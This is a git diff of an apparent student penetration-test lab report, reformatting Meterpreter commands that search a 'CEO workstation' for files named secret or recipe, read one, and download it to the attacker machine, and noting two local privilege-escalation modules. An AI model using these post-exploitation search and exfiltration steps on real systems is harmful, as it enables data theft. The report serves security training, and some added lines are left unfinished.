@@ -101,7 +101,7 @@ As can be seen above the exploit was successful and an `open session` was establ
   
 The next part of the security test was to see if files that contain the strings `recipe` or `secretfile` could be found.
   
-   -  Command To Search For `secret` Text File = search -f *secret*.txt
+   -  Command To Search For `secret` Text File = `search -f *secret*.txt`
       * search = command to run a search
       * -f = indicates that the search is for a file
       * *secret*.txt = indicate to search all text files containing the word `secret` 
@@ -111,7 +111,7 @@ The next part of the security test was to see if files that contain the strings 
   
 As can be seen above the command was successful in finding a file with `secretfile.txt` and revealed the path to the file.
   
-   -  Command To Search For `recipe` Text File = search -f *recipe*.txt
+   -  Command To Search For `recipe` Text File = `search -f *recipe*.txt`
       * search = command to run a search
       * -f = indicates that the search is for a file
       * *recipe*.txt = indicate to search all text files containing the word `recipe` 
@@ -123,13 +123,13 @@ Again, the search was successful in finding a file containing the word `recipe` 
 From root directory we changed into the directory where the `Drinks.recipe.txt` was found.
 
 Once in the directory we read the contents of the file.
-   -  Command To Open & Read File = cat `Drinks.recipe.txt` (see results below)
+   -  Command To Open & Read File = `cat Drinks.recipe.txt` (see results below)
   
 ![TODO](https://github.com/Tamie13/Penetration-Testing-Week-2/blob/main/Unit%2017%20Illustrations/Drink%20Recipe.png)
   
 Taking the security testing further we were able to exfiltrate the `Drinks.recipe.text` and download it from the CEO's workstation back to the attacker machine.
 
-   -  Command To Exfiltrate & Download Recipe = `download 'c:\Users\IEUser\Documents\Drinks.recipe.txt'
+   -  Command To Exfiltrate & Download Recipe = `download 'c:\Users\IEUser\Documents\Drinks.recipe.txt'`
   
 ![TODO](https://github.com/Tamie13/Penetration-Testing-Week-2/blob/main/Unit%2017%20Illustrations/download%20recipe.png)
   
@@ -143,11 +143,11 @@ The find other possible exploits the local `workstation` was searched:
   
 ![TODO](https://github.com/Tamie13/Penetration-Testing-Week-2/blob/main/Unit%2017%20Illustrations/Exploit%20Suggester%20Run.png)
   
-Two additional vulnerabilties were found using this command as can be seen above.
+Two additional vulnerabilties were found using this command as can be seen above but were not run against the CEO's workstation.
+   -  Click [Here](https://nvd.nist.gov/vuln/detail/CVE-2016-3225) for additional information about `exploit/windows/local/ms16_075_refelction as known as `CVE-2016-3225`
+   - Click [Here]() for additional information about `exploit/windows/local/ikeext_service also known as 
   
 
-
-There should be a separate finding for each vulnerability found.
 
 
 
